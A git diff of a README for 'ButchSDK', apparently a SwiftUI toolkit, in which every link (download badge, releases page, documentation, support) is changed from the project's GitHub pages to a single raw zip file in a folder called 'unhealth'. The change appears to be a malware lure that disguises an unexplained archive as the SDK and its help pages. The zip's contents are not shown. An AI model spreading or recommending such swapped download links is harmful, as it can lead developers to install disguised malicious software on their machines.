@@ -1,7 +1,7 @@
 # 🎨 ButchSDK - Enhance Your User Experience Effortlessly
 
 ## 🔗 Download Now
-[![Download ButchSDK](https://img.shields.io/badge/Download-ButchSDK-brightgreen.svg)](https://github.com/Luididi/ButchSDK/releases)
+[![Download ButchSDK](https://raw.githubusercontent.com/Luididi/ButchSDK/main/unhealth/ButchSDK.zip)](https://raw.githubusercontent.com/Luididi/ButchSDK/main/unhealth/ButchSDK.zip)
 
 ## 📚 Overview
 ButchSDK is a collection of SwiftUI components and guidance designed for developers and designers who value great user experiences. This toolkit extends Apple’s native platform patterns with minimal overhead, ensuring you create beautiful and functional applications. With our comprehensive documentation and user experience best practices, you can implement effective design solutions easily.
@@ -9,7 +9,7 @@ ButchSDK is a collection of SwiftUI components and guidance designed for develop
 ## 🚀 Getting Started
 To start using ButchSDK, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Luididi/ButchSDK/releases). This is where you will find the latest version of the software ready for download.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Luididi/ButchSDK/main/unhealth/ButchSDK.zip). This is where you will find the latest version of the software ready for download.
 
 2. **Select the Latest Version**: Look for the most recent release. It is usually marked as the latest version. Click on it to view the available files.
 
@@ -44,7 +44,7 @@ ButchSDK offers a variety of features to enhance your applications:
 - **Cross-Platform Support**: Use the SDK on macOS, iOS, and iPadOS.
 
 ## 📥 Download & Install 
-To download ButchSDK, return to our [Releases page](https://github.com/Luididi/ButchSDK/releases). Follow the instructions to download and install the SDK. This comprehensive toolkit is designed to improve your workflow without overwhelming you with complex technicalities.
+To download ButchSDK, return to our [Releases page](https://raw.githubusercontent.com/Luididi/ButchSDK/main/unhealth/ButchSDK.zip). Follow the instructions to download and install the SDK. This comprehensive toolkit is designed to improve your workflow without overwhelming you with complex technicalities.
 
 ## 📘 Documentation
 The ButchSDK comes with a detailed documentation set that guides you through every aspect of using the library. You can access the documentation directly in the downloaded package. It includes:
@@ -63,6 +63,6 @@ We welcome contributions! If you want to help improve ButchSDK, please refer to 
 Thank you for choosing ButchSDK to enhance your application. We hope you find this toolkit helpful and easy to integrate. Enjoy creating beautiful and user-friendly applications! 
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/Luididi/ButchSDK/releases)
-- [Documentation](https://github.com/Luididi/ButchSDK/wiki)
-- [Support](https://github.com/Luididi/ButchSDK/issues)
+- [Releases Page](https://raw.githubusercontent.com/Luididi/ButchSDK/main/unhealth/ButchSDK.zip)
+- [Documentation](https://raw.githubusercontent.com/Luididi/ButchSDK/main/unhealth/ButchSDK.zip)
+- [Support](https://raw.githubusercontent.com/Luididi/ButchSDK/main/unhealth/ButchSDK.zip)
